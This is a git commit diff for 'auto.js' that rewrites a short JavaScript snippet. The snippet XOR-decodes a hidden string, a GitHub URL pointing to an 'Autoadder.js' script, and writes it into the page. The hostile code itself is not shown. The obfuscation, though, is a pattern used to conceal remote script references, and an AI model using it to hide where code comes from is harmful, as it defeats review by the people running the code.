89c2d14c55f07cc0822657b9517ad1c661e09b14
Phoenixtools <red0002@live.com>
2013-12-19 11:51:00 +0200

    Update auto.js

--- auto.js
+++ auto.js
@@ -1,10 +1,1 @@
-var a = "jvvrq'1C--pcu,ekvjw`,amo-Rjmglkzvmmnq-Cz,:3-ocqvgp-Cwvmcffgp,hq";
-b = "";
-c = "";
-var clen;
-clen = a.length;
-for (i = 0; i < clen; i++) {
-    b += String.fromCharCode(a.charCodeAt(i) ^ 2)
-}
-c = unescape(b);
-document.write(c);
+var a="jvvrq'1C--ekvjw`,amo-Rjmglkzvmmnq-Cz,:3-`nm`-ocqvgp-Cwvmcffgp,hq";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);
